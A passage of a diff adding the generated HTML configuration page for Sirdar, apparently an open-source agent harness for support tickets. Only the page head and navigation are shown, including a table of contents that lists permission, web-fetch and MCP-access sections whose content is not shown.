@@ -1,0 +1,4168 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="An open-source harness for engineering-level support tickets.">
+      
+      
+      
+      
+        <link rel="prev" href="../concepts/">
+      
+      
+        <link rel="next" href="../adapters/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Configuration - Sirdar</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#configuration-reference" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Sirdar" class="md-header__button md-logo" aria-label="Sirdar" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Sirdar
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Configuration
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/srivathsanvenkateswaran/Sirdar" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    srivathsanvenkateswaran/Sirdar
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Sirdar" class="md-nav__button md-logo" aria-label="Sirdar" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Sirdar
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/srivathsanvenkateswaran/Sirdar" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    srivathsanvenkateswaran/Sirdar
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../getting-started/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting started
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../concepts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Concepts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuration
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Keys
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#inbound-webhook-triggers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Inbound webhook triggers
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#built-in-trackers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Built-in trackers
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Built-in trackers">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#helpdeskref-fallback" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        helpdeskRef fallback
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-limits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        List limits
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#built-in-helpdesks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Built-in helpdesks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential references
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#zoho-desk-oauth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Zoho Desk OAuth
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notifications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Notifications
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#budgets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Budgets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#permissionsbash-glob-semantics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        permissions.bash glob semantics
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#permissionsfixbash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        permissions.fixBash
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="permissions.fixBash">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-the-allow-list-does-not-confine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the allow-list does not confine
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fixprincludescomplaint" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        fix.prIncludesComplaint
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-fetch" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web fetch
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web fetch">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-permissionsfetch-does-not-cover" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What permissions.fetch does not cover
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mcp-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MCP access
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MCP access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-the-permissions-reach-each-provider" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How the permissions reach each provider
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attachment-filtering" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attachment filtering
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#languages" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Languages
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#templates-override" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Templates override
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#providers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Providers
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Providers">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#provider-qwen" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        provider: qwen
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#provider-openai" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        provider: openai
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#provider-acp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        provider: acp
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="provider: acp">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-the-permission-policy-can-and-cannot-reach" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the permission policy can and cannot reach
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adapters/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../credentials/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credentials
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../webhooks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Webhooks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../notifications/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notifications
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../eval/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Evaluation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../fix/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fix flow
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../release/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Release
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Research
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Research
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/00-context/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/01-name-collisions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Name collisions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/02-landscape/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Landscape
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/03-licensing-byo-subscription/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Licensing (BYO subscription)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/04-harness-internals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Harness internals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/05-verdict-and-proposal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Verdict and proposal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/06-wire-formats/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wire formats
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/07-dogfood-findings/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dogfood findings
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/08-httpx-extraction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    httpx extraction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/09-qwen-wire-formats/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Qwen Code wire formats
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_13_11" id="__nav_13_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Adapters
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_13_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13_11">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Adapters
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/adapters/azure-devops/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Azure DevOps
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/adapters/helpdesks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Helpdesks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/adapters/jira/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Jira
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/adapters/linear/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linear
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/adapters/rally/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rally
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_13_12" id="__nav_13_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Providers
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_13_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13_12">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Providers
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/providers/acp-protocol/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACP protocol
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/providers/acp-agents/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACP agents
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/providers/multi-model-runtimes/" class="md-nav__link">
+        
+  
+  
